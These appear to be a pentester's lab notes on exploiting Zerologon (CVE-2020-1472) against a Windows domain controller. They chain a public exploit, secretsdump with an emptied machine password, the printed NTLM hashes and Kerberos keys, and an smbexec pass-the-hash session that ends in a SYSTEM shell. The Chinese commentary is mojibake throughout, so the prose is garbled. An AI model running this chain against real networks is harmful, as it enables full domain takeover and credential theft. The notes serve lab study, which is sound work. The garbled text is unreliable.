[CVE-2020-1472: NetLogonç‰¹æƒæå‡æ¼æ´ï¼ˆé™„expå¤ç°ï¼‰ - Bypass - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/xiaozi/p/13678055.html)

[è·å–åŸŸæ§æƒé™.pdf](file:///F:/æš—æœˆæ¸—é€/æ–°/æ¸—é€æµ‹è¯•23 å†…ç½‘æ¸—é€ç¯‡/è·å–åŸŸæ§æƒé™.pdf)

```http
https://github.com/dirkjanm/CVE-2020-1472
```

```bash
proxychains4 python3 cve-2020-1472.py dc dc$ 10.10.10.139  
```

æˆåŠŸæŠŠåŸŸæ§å¯†ç ç½®ç©ºï¼š

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_17-50-30.png" alt="Snipaste_2023-05-12_17-50-30" style="zoom:80%;" />

## ç©ºå¯†ç æ¨ªå‘

```bash
â””â”€# proxychains4 python3 secretsdump.py 'fbi.gov/dc$@10.10.10.139' -no-pass  
```

```
[proxychains] Dynamic chain  ...  127.0.0.1:53301  ...  10.10.10.139:445  ...  OK
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Dynamic chain  ...  127.0.0.1:53301  ...  10.10.10.139:135  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:53301  ...  10.10.10.139:49669  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d19009f38e6b6720109b3fab3fa98090:::
fbi.gov\fileserver:1103:aad3b435b51404eeaad3b435b51404ee:a7670b92c536e6684b3620f2ddca7539:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
FILESERVER$:1104:aad3b435b51404eeaad3b435b51404ee:007803fe050526edbc7ea8f321544cb8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a4b17d1c198d7e84afdc7879ad5b97f0da34d1f3e6fd0be1ecd4784a77918425
Administrator:aes128-cts-hmac-sha1-96:4dfa69ce7f92780bccfd24aecb7b20d9
Administrator:des-cbc-md5:2a7fcdc4bcbcadec
krbtgt:aes256-cts-hmac-sha1-96:4d4002368e4e7970bf5cf920bc8de2ed5d77dcf58ec649b02cdede0b3f0f2130
krbtgt:aes128-cts-hmac-sha1-96:f23ad681adf209b1f21c5554e828a85b
krbtgt:des-cbc-md5:4fa19183bc5be38f
fbi.gov\fileserver:aes256-cts-hmac-sha1-96:ced6482b3d945503d2d87fc38db7b6d72439e987c96f1a40427ee80dbd150fb1
fbi.gov\fileserver:aes128-cts-hmac-sha1-96:2f0ef12454dc325b520b8f38afd6d588
fbi.gov\fileserver:des-cbc-md5:98aea8f14a325e97
DC$:aes256-cts-hmac-sha1-96:61df1f3d887f788352e6a215260741fe50ab7c8304878a99218e644bbac683d5
DC$:aes128-cts-hmac-sha1-96:90307e2edc8642691d28ae3c98e05792
DC$:des-cbc-md5:68409d31b591a18c
FILESERVER$:aes256-cts-hmac-sha1-96:3765b6f2a083940807a32d6af5e1edf6af90da68d356588249e99467b543c54d
FILESERVER$:aes128-cts-hmac-sha1-96:7e4d955ff4dd9230aba760251a8292ae
FILESERVER$:des-cbc-md5:d37013b067436d57
[*] Cleaning up... 
```

æ­¤æ—¶ dc$ çš„ hash å·²ç»è¢«ç½®ç©º

<img src=".\å›¾ç‰‡\Snipaste_2023-05-12_18-09-07.png" alt="Snipaste_2023-05-12_18-09-07" style="zoom:67%;" />

å¾—åˆ°äº†åŸŸæ§çš„ hashï¼š

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3:::
```

ä½¿ç”¨administratorçš„hashæ¨ªå‘è¿æ¥ï¼Œåˆ©ç”¨smbexec.py ç™»å½•åŸŸæ§

```bash
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/impacket-master/examples]
â””â”€# proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3 dc$/administrator@10.10.10.139               
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Dynamic chain  ...  127.0.0.1:53301  ...  10.10.10.139:445  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

çµæŸ

# æ€»ç»“

æ€»ä½“ä¸éš¾ï¼Œæ²¡æœ‰è¶…çº²çš„ï¼Œæ‰¾expç„¶ååˆ©ç”¨

æ”¶è·æ˜¯ï¼Œå¯¹æ¸—é€æµ‹è¯•çš„è¿‡ç¨‹æœ‰äº†ä¸€ä¸ªæ•´ä½“æŠŠæ¡

å¯¹å…æ€çš„æ”¶è·è¿˜æ˜¯æœ‰çš„






